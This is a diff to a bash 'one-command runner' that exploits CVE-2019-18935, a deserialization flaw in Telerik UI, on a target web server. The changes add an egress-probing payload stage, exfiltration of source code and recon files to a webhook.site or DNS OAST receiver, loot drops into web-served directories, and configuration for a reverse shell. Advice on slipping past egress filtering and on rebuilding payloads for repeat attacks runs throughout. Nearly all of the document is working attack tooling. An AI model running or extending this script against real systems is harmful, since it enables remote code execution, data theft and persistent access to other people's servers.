@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 #
-# CVE-2019-18935 — fully self-configuring one-command runner.
+# CVE-2019-18935 â€” fully self-configuring one-command runner.
 # You give it NOTHING (or just a URL) and it finds the target, the version,
 # and fires the payload, printing a big SUCCESS banner the instant RCE
 # is confirmed.
@@ -9,11 +9,18 @@
 #
 #   ./run.sh                 # auto: find target + version, prove RCE (sleep)
 #   ./run.sh shell           # ...then fire the reverse shell (start nc first)
+#   ./run.sh egress          # ...then prove outbound egress from the target
+#   ./run.sh rebuild         # build fresh payloads (every attempt needs new ones)
 #   ./run.sh http://HOST:82  # pin the target; everything else still auto
 #
 # Env vars (all optional, all auto-detected if unset):
 #   TARGET_URL / PAGE_URL / FOLDER / ARCH / VERSION /
-#   REV_HOST / REV_PORT / PYTHON
+#   REV_HOST / REV_PORT / PYTHON / C2_URL / DNS_DOMAIN / DROPS
+#
+# C2_URL   = receiver base URL, e.g. https://webhook.site/<uuid>
+# DNS_DOMAIN = OAST domain for the DNS fallback channel, e.g. abc123.oast.pro
+# DROPS    = extra web-served dirs (space separated) the payload should copy loot
+#            into; run `./run.sh writemap` first and pass every GOOD+served dir.
 #
 # The ONLY thing you may need to set for 'shell' is where the target can
 # reach your C2:  REV_HOST=<ip> REV_PORT=<port>
@@ -40,16 +47,16 @@ banner() { # $1 = text
 # ---------------------------------------------------------------- args
 ARG="${1:-auto}"
 case "$ARG" in
-  auto|check|versions|exploit|shell|all|dumpsrc|writemap|exfil) STAGE="$ARG" ;;
+  auto|check|versions|exploit|shell|all|dumpsrc|writemap|egress|exfil|rebuild) STAGE="$ARG" ;;
   http://*|https://*)
     TARGET_URL="$ARG"
     case "${2:-}" in
       "") STAGE="${STAGE:-all}" ;;
-      auto|check|versions|exploit|shell|all|dumpsrc|writemap|exfil) STAGE="$2" ;;
+      auto|check|versions|exploit|shell|all|dumpsrc|writemap|egress|exfil|rebuild) STAGE="$2" ;;
       *) die "unknown stage '$2'" ;;
     esac
     ;;
-  *) die "usage: $0 [auto|check|versions|exploit|shell|dumpsrc|writemap|exfil|all|http(s)://HOST:PORT]" ;;
+  *) die "usage: $0 [auto|check|versions|exploit|shell|dumpsrc|writemap|egress|exfil|rebuild|all|http(s)://HOST:PORT]" ;;
 esac
 
 BASE_URL=""
@@ -87,16 +94,56 @@ pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll for $ARC
   esac
   printf '%s' "$p"
 }
+
+# All payloads for a base+arch, newest first (space separated, names have no spaces).
+list_payloads() {
+  local base="$1" a="$2"
+  case "$a" in
+    x86)   ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null || true ;;
+    amd64) ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null || true ;;
+    *)     ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null || true ;;
+  esac
+}
 SLEEP_DLL="$(pick_payload sleep)"
 REV_DLL="$(pick_payload revshell)"
 DUMP_DLL="$(pick_payload dump-src)"
 EXFIL_DLL="$(pick_payload exfil)"
+PROBE_DLL="$(pick_payload probe-net)"
 C2_URL="${C2_URL:-}"
+DNS_DOMAIN="${DNS_DOMAIN:-}"
+DROPS="${DROPS:-}"
+PAYLOAD="${PAYLOAD:-}"
 [ -n "$SLEEP_DLL" ] || die "No sleep payload in $PAYLOAD_DIR (run on Windows / let CI build, or ARCH=x86)"
 info "sleep payload:   $SLEEP_DLL"
 [ -n "$REV_DLL" ] && info "revshell payload: $REV_DLL"
 [ -n "$DUMP_DLL" ] && info "dump-src payload: $DUMP_DLL"
 [ -n "$EXFIL_DLL" ] && info "exfil payload:    $EXFIL_DLL"
+[ -n "$PROBE_DLL" ] && info "egress payload:   $PROBE_DLL"
+
+# A .NET assembly can only be loaded once per w3wp process: the same DLL file is
+# a no-op on a second trigger (AssemblyInstaller resolves by assembly identity,
+# which carries the filename). Track what we have already fired.
+FIRED="$ROOT/.fired"
+mark_fired() { printf '%s\n' "$1" >> "$FIRED"; }
+was_fired()  { [ -f "$FIRED" ] && grep -qxF "$1" "$FIRED" 2>/dev/null; }
+
+# Newest payload for base+arch that has not been fired yet. Sets CHOSEN and
+# CHOSEN_FIRED; PAYLOAD=<path> overrides the choice.
+CHOSEN=""; CHOSEN_FIRED=0
+choose_unfired() {
+  local base="$1" a="$2" f
+  CHOSEN=""; CHOSEN_FIRED=0
+  if [ -n "$PAYLOAD" ]; then
+    CHOSEN="$PAYLOAD"
+    was_fired "$PAYLOAD" && CHOSEN_FIRED=1
+    return
+  fi
+  for f in $(list_payloads "$base" "$a"); do
+    if ! was_fired "$f"; then CHOSEN="$f"; return; fi
+  done
+  CHOSEN=$(list_payloads "$base" "$a" | head -1)
+  [ -n "$CHOSEN" ] && CHOSEN_FIRED=1
+}
 
 # ---------------------------------------------------------------- target discovery
 host_ip() { # $1 interface name
@@ -211,14 +258,22 @@ stage_versions() {
 
 # upload + return the remote filename the target reports.
 # Diagnostics go to stderr; ONLY the filename goes to stdout (it is captured).
-upload_payload() { # $1 dll  $2 ver  $3 folder -> echo remote filename (stdout only)
-  local dll="$1" ver="$2" folder="$3"
-  log "UPLOAD: $(basename "$dll") -> $folder" >&2
-  local out remote
-  out=$("$PYTHON" CVE-2019-18935.py -t -u "$TARGET_URL" -v "$ver" -f "$folder" -p "$dll" 2>&1)
+upload_payload() { # $1 dll  $2 ver  $3 folder  [$4 exact remote name] -> echo remote filename
+  local dll="$1" ver="$2" folder="$3" want="${4:-}"
+  log "UPLOAD: $(basename "$dll") -> $folder${want:+ as $want}" >&2
+  local out remote args
+  args=(-t -u "$TARGET_URL" -v "$ver" -f "$folder" -p "$dll")
+  [ -n "$want" ] && args+=(-N "$want")
+  out=$("$PYTHON" CVE-2019-18935.py "${args[@]}" 2>&1)
   printf '%s\n' "$out" | sed 's/^/      /' >&2
-  remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
-  [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE '"TempFileName":"[^"]+"' | head -1 | sed 's/.*"TempFileName":"//; s/"$//')
+  if [ -n "$want" ]; then
+    remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '$want'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
+    # the target may rename; fall back to whatever it actually reports
+    [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
+  else
+    remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
+    [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE '"TempFileName":"[^"]+"' | head -1 | sed 's/.*"TempFileName":"//; s/"$//')
+  fi
   printf '%s' "$remote"
 }
 
@@ -228,9 +283,9 @@ num_ge() { # $1 a  $2 b -> exit 0 if a >= b
 }
 
 # fire the deserialize trigger and echo the measured seconds
-trigger_and_time() { # $1 remote filename  -> echo seconds
+trigger_and_time() { # $1 remote filename  [$2 what to expect]
   local remote="$1" t0 t1 rt
-  log "TRIGGER: deserializing (sleep payload -> expect ~10s pause)" >&2
+  log "TRIGGER: deserializing${2:+ ($2)}" >&2
   t0=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
   "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
   t1=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
@@ -255,14 +310,17 @@ stage_exploit() {
 
   local a folder remote rt success=0 dll
   for a in "${arches[@]}"; do
-    dll=$(ARCH="$a" pick_payload sleep)
+    choose_unfired sleep "$a"
+    dll="$CHOSEN"
     [ -n "$dll" ] || { warn "no $a sleep payload"; continue; }
+    [ "$CHOSEN_FIRED" -eq 1 ] && warn "$(basename "$dll") already fired â€” rebuild for a new assembly name."
     for folder in "${FOLDER_CANDIDATES[@]}"; do
       [ -n "$folder" ] || continue
       remote=$(upload_payload "$dll" "$VERSION" "$folder")
       [ -n "$remote" ] || { info "upload gave no filename in $folder; trying next"; continue; }
       info "remote file: $remote  (in $folder)"
       rt=$(trigger_and_time "$remote")
+      mark_fired "$dll"
       info "response: ${rt}s"
       if num_ge "$rt" 8; then
         banner "SUCCESS  -  CVE-2019-18935 CONFIRMED (RCE)"
@@ -287,13 +345,17 @@ stage_exploit() {
 }
 
 # generic upload+trigger with a chosen payload
-fire_payload() { # $1 dll path  -> fires upload + deserialize once, prints result
+fire_payload() { # $1 dll path  [$2 folder]
   local dll="$1" folder="${2:-C:\Windows\Temp}"
   local remote
+  if was_fired "$dll"; then
+    warn "$(basename "$dll") was already fired â€” a re-trigger only re-runs if the app pool recycled."
+  fi
   remote=$(upload_payload "$dll" "$VERSION" "$folder")
   [ -n "$remote" ] || { warn "no filename reported for $(basename "$dll") in $folder"; return 1; }
   info "remote file: $remote"
   trigger_and_time "$remote"
+  mark_fired "$dll"
   return 0
 }
 
@@ -306,10 +368,11 @@ stage_dumpsrc() {
   info "  http://<host>:82/src.zip"
   info "  http://<host>:82/StartUp/src.zip"
   info ""
-  local a arches rt done=0
+  local a arches rt done=0 dll
   if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
   for a in "${arches[@]}"; do
-    local dll; dll=$(ARCH="$a" pick_payload dump-src)
+    choose_unfired dump-src "$a"
+    dll="$CHOSEN"
     [ -n "$dll" ] || { warn "no $a dump-src payload"; continue; }
     log "FIRE: $(basename "$dll") (arch $a)"
     rt=$(fire_payload "$dll" "C:\Windows\Temp")
@@ -323,9 +386,11 @@ stage_dumpsrc() {
 stage_writemap() {
   [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
   banner "WRITE-MAP"
-  info "Probing candidate directories with a tiny marker upload."
-  info "GOOD = writable. Then curl the URL to see if it is also served."
+  info "Uploading a tiny marker into each candidate dir."
+  info "GOOD = writable. It is also fetched back: SERVED = writable AND downloadable."
   info ""
+
+  local root="http://${KNOWN_HOST}:${KNOWN_PORT}"
   local marker="$ROOT/.writemap.txt"
   printf 'writemap %s\n' "$(date -u +%Y%m%dT%H%M%SZ)" > "$marker"
 
@@ -343,54 +408,174 @@ stage_writemap() {
     'C:\inetpub\ftproot'
     'C:\Windows\Temp'
   )
-  local d remote
+  # dir -> URL path under the site root
+  url_for_dir() {
+    case "$1" in
+      'C:\inetpub\wwwroot')              printf '/' ;;
+      'C:\inetpub\wwwroot\StartUp')      printf '/StartUp/' ;;
+      'C:\inetpub\wwwroot\'*)            printf '/%s/' "$(printf '%s' "$1" | sed 's#^C:\\inetpub\\wwwroot\\##; s#\\#/#g')" ;;
+      'C:\inetpub\vhosts\default\htdocs') printf '/' ;;
+      *)                                 printf '' ;;
+    esac
+  }
+
+  local d remote url code served=()
   for d in "${dirs[@]}"; do
     remote=$(upload_payload "$marker" "$VERSION" "$d" 2>/dev/null)
     if [ -n "$remote" ]; then
-      printf '  %bGOOD%b   %s  ->  %s\n' "$G" "$N" "$d" "$remote"
+      url="$(url_for_dir "$d")"
+      if [ -n "$url" ]; then
+        code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 "${root}${url}${remote}" 2>/dev/null || echo 000)
+        if [ "$code" = "200" ]; then
+          printf '  %bSERVED%b %s  ->  %s%s\n' "$G" "$N" "$d" "$url" "$remote"
+          served+=("$d")
+        else
+          printf '  %bwritable%b %s  (HTTP %s)\n' "$Y" "$N" "$d" "$code"
+        fi
+      else
+        printf '  %bwritable%b %s  (no URL mapping; probe by hand)\n' "$Y" "$N" "$d"
+      fi
     else
-      printf '  %bno%b     %s\n' "$Y" "$N" "$d"
+      printf '  %bno%b       %s\n' "$Y" "$N" "$d"
     fi
   done
   rm -f "$marker"
   info ""
-  info "For every GOOD entry, test whether it is served:"
-  info "  curl -s -o /dev/null -w '%{http_code}\\n' http://<host>:82/<rel>/<name>"
-  info "A 200 means writable AND served - drop src.zip there."
+  if [ "${#served[@]}" -gt 0 ]; then
+    banner "WRITABLE + SERVED: pass these to exfil"
+    info "DROPS='${served[*]}' ./run.sh exfil"
+    info "The exfil payload copies src.zip, exfil.log and the recon files into"
+    info "every DROPS dir, so you can pull them with curl even with egress shut."
+  else
+    info "No dir is both writable and served. Egress/DNS is the remaining channel:"
+    info "  DNS_DOMAIN=<interactsh-domain> ./run.sh exfil"
+  fi
+}
+
+stage_egress() {
+  [ -n "$PROBE_DLL" ] || die "No probe-net payload in $PAYLOAD_DIR (rebuild payloads)."
+  banner "EGRESS PROBE"
+  info "This is the 'did the payload run at all, or is egress filtered?' oracle."
+  info "It TCP-connects from the target and sleeps in proportion to what worked,"
+  info "so the response time encodes the answer:"
+  info "    0-6s   -> nothing reachable (egress filtered / payload broke)"
+  info "    ~8s    -> 1 endpoint reachable"
+  info "    ~16s   -> 2 endpoints reachable"
+  info "    ~24s+  -> 3+ endpoints: outbound works, stop guessing and exfil"
+  info ""
+  local eps=()
+  local hostport
+  if [ -n "$C2_URL" ]; then
+    hostport=$(printf '%s' "$C2_URL" | sed -E 's#^[a-z]+://##; s#/.*$##')
+    case "$hostport" in
+      *:*) eps+=("$hostport") ;;
+      *)   case "$C2_URL" in
+             https://*) eps+=("$hostport:443" "$hostport:80") ;;
+             *)         eps+=("$hostport:80" "$hostport:443") ;;
+           esac ;;
+    esac
+  fi
+  eps+=("1.1.1.1:443" "8.8.8.8:53")
+  [ -n "$DNS_DOMAIN" ] && eps+=("dns:$DNS_DOMAIN")
+
+  local cfg="$ROOT/.net.txt" rn rt
+  local saved_payload="$PAYLOAD"
+  PAYLOAD=""                      # the probe is always probe-net, never $PAYLOAD
+  choose_unfired probe-net x86
+  PAYLOAD="$saved_payload"
+  local probe="$CHOSEN"
+  [ -n "$probe" ] || probe="$PROBE_DLL"
+  [ -n "$probe" ] || die "No probe-net payload (rebuild payloads)."
+  [ "$CHOSEN_FIRED" -eq 1 ] && warn "$(basename "$probe") already fired â€” rebuild if the app pool has not recycled."
+  printf '%s\n' "${eps[@]}" | awk '!seen[$0]++' > "$cfg"
+  info "endpoints: $(tr '\n' ' ' < "$cfg")"
+  rn=$(upload_payload "$probe" "$VERSION" 'C:\Windows\Temp')
+  rm -f "$cfg"
+  [ -n "$rn" ] || die "Could not upload the probe payload."
+  rt=$(trigger_and_time "$rn" "egress probe: expect 8s per reachable endpoint")
+  mark_fired "$probe"
+  info "response: ${rt}s"
+  case "$rt" in
+    ''|*[!0-9.]*) warn "unparseable timing" ; return 1 ;;
+  esac
+  if num_ge "$rt" 7.5; then
+    banner "EGRESS OPEN â€” outbound works"
+    info "Fire the exfil:  C2_URL=... DNS_DOMAIN=... ./run.sh exfil"
+    return 0
+  fi
+  warn "EGRESS APPEARS BLOCKED (or the payload did not run)."
+  info "Next, in this order:"
+  info "  1. ./run.sh exfil         # the payload itself may still reach an allowed IP"
+  info "  2. DNS: set DNS_DOMAIN=<interactsh domain> and re-run â€” UDP/53 is rarely filtered"
+  info "  3. writemap: find a writable+served dir and use DROPS=..."
+  info "  4. ./run.sh shell         # reverse shell over an allowed port (443)"
+  return 1
 }
 
 stage_exfil() {
   [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
   [ -n "$EXFIL_DLL" ] || die "No exfil payload in $PAYLOAD_DIR."
-  [ -n "$C2_URL" ] || die "Set C2_URL to a receiver, e.g. C2_URL=https://webhook.site/<uuid>"
+  [ -n "$C2_URL" ] || [ -n "$DNS_DOMAIN" ] || die "Set C2_URL (https receiver) and/or DNS_DOMAIN."
   banner "EXFIL"
-  info "Receiver: $C2_URL"
+  info "webhook.site free tokens cap at 100 requests and expire when idle â€”"
+  info "make a fresh token for every attempt."
   info ""
 
-  local cfg="$ROOT/.c2.txt"
-  printf '%s\n' "$C2_URL" > "$cfg"
+  # ---- build the receiver config, one directive per line -------------------
+  local cfg="$ROOT/.c2.txt" rc
+  : > "$cfg"
+  [ -n "$C2_URL" ] && printf '%s\n' "$C2_URL" >> "$cfg"
+  [ -n "$DNS_DOMAIN" ] && printf 'dns:%s\n' "$DNS_DOMAIN" >> "$cfg"
+  local d
+  for d in $DROPS; do printf 'drop:%s\n' "$d" >> "$cfg"; done
+  info "receiver config:"
+  sed 's/^/      /' "$cfg"
+
+  # ---- drop it at the FIXED name the payload looks for --------------------
   log "uploading receiver config -> C:\\Windows\\Temp\\c2.txt"
-  local rc
-  rc=$(upload_payload "$cfg" "$VERSION" 'C:\Windows\Temp' 2>/dev/null)
+  rc=$(upload_payload "$cfg" "$VERSION" 'C:\Windows\Temp' 'c2.txt')
   rm -f "$cfg"
   if [ -z "$rc" ]; then
-    warn "could not upload c2.txt; the payload will skip the network step"
+    warn "c2.txt upload failed; the payload will fall back to scanning *.txt in Temp"
+  elif [ "$rc" != "c2.txt" ]; then
+    warn "target renamed the config to '$rc'; the payload's fallback scan will still find it"
   else
-    info "config uploaded as $rc"
+    info "config in place as C:\\Windows\\Temp\\c2.txt"
   fi
 
-  local a arches dll
+  # ---- prove egress first (cheap, and tells us if the rest can work) ------
+  if [ -n "$PROBE_DLL" ]; then
+    stage_egress || true
+  fi
+
+  # ---- fire -----------------------------------------------------------------
+  local a arches dll rt
   if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
   for a in "${arches[@]}"; do
-    dll=$(ARCH="$a" pick_payload exfil)
+    choose_unfired exfil "$a"
+    dll="$CHOSEN"
     [ -n "$dll" ] || { warn "no $a exfil payload"; continue; }
+    if [ "$CHOSEN_FIRED" -eq 1 ]; then
+      warn "$(basename "$dll") was already loaded in w3wp â€” re-triggering it is a no-op."
+      warn "Rebuild the payloads (CI or build-dll.bat) for a fresh assembly name."
+    fi
     log "FIRE: $(basename "$dll") (arch $a)"
-    fire_payload "$dll" 'C:\Windows\Temp' || warn "fire failed for $a"
+    rt=$(fire_payload "$dll" 'C:\Windows\Temp')
+    info "response: $(printf '%s' "$rt" | tail -1)s (async worker, so this stays short even on success)"
     break
   done
+
+  # ---- collect --------------------------------------------------------------
+  local token=""
+  [ -n "$C2_URL" ] && token=$(printf '%s' "$C2_URL" | sed -nE 's#.*/([0-9a-fA-F-]{36}).*#\1#p')
   info ""
-  info "Give it ~60s, then reassemble:"
-  info "  ./pull-exfil.sh <token-uuid>"
+  if [ -n "$token" ]; then
+    info "Polling the receiver for up to 5 min. Ctrl-C and re-run this line any time:"
+    info "  ./pull-exfil.sh $token"
+    ( cd "$ROOT" && bash ./pull-exfil.sh "$token" ) || true
+  else
+    info "Pull manually:  ./pull-exfil.sh <token-uuid>"
+  fi
   banner "EXFIL FIRED"
 }
 
@@ -404,13 +589,24 @@ stage_shell() {
   banner "REVERSE SHELL"
   info "C2 target (the machine the WEB SERVER connects back to): $REV_HOST:$REV_PORT"
   info "Make sure a listener is running there:  nc -lvp $REV_PORT"
+  info "Port 443/80 is far more likely to pass egress filtering than 4444."
   info ""
+
+  # The payload cannot see our env, so ship the C2 to it.
+  local cfg="$ROOT/.rev.txt" rc
+  printf '%s:%s\n' "$REV_HOST" "$REV_PORT" > "$cfg"
+  rc=$(upload_payload "$cfg" "$VERSION" 'C:\Windows\Temp' 'rev.txt')
+  rm -f "$cfg"
+  [ "$rc" = "rev.txt" ] || warn "rev.txt landed as '${rc:-nothing}'; payload will fall back to 127.0.0.1:4444"
+
   local arches
   if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
   local a folder remote triggered=0 dll
   for a in "${arches[@]}"; do
-    dll=$(ARCH="$a" pick_payload revshell)
+    choose_unfired revshell "$a"
+    dll="$CHOSEN"
     [ -n "$dll" ] || { warn "no $a revshell payload"; continue; }
+    [ "$CHOSEN_FIRED" -eq 1 ] && warn "$(basename "$dll") already fired â€” rebuild for a new assembly name."
     for folder in "${FOLDER_CANDIDATES[@]}"; do
       [ -n "$folder" ] || continue
       log "SHELL: uploading $(basename "$dll") -> $folder (arch $a)"
@@ -418,6 +614,7 @@ stage_shell() {
       [ -n "$remote" ] || { info "no filename in $folder; trying next"; continue; }
       info "remote file: $remote"
       "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
+      mark_fired "$dll"
       info "Fired in $folder (arch $a). Check your C2 listener for the callback."
       triggered=1
       # keep trying other combos in the background is overkill; stop here.
@@ -433,14 +630,36 @@ stage_shell() {
   info "If no callback: try the other arch (ARCH=amd64/x86) and/or another version."
 }
 
+stage_rebuild() {
+  banner "REBUILD PAYLOADS"
+  info "Every attempt needs fresh DLLs: a loaded assembly name is dead in w3wp."
+  info ""
+  if command -v cl.exe >/dev/null 2>&1; then
+    local s
+    for s in sleep revshell dump-src exfil probe-net; do
+      log "build-dll.bat $s.c"
+      cmd //c build-dll.bat "$s.c" || warn "build failed for $s.c"
+    done
+    return 0
+  fi
+  info "No cl.exe here (macOS/Linux). Let CI build them:"
+  info "  git add -A && git commit -m 'payloads' && git push"
+  info "  gh workflow run build-dlls.yml    # if you have gh"
+  info "then:  git pull"
+  info ""
+  info "Or on any Windows box with Visual Studio:  build-dll.bat exfil.c"
+}
+
 # ---------------------------------------------------------------- dispatch
 log "CVE-2019-18935 one-command runner (stage: $STAGE)"
 case "$STAGE" in
+  rebuild)  stage_rebuild ;;
   check)    stage_check ;;
   versions) stage_check; stage_versions ;;
   exploit|all) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exploit ;;
   shell)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_shell ;;
   dumpsrc)  stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_dumpsrc ;;
   writemap) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_writemap ;;
+  egress)   stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_egress ;;
   exfil)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exfil ;;
 esac
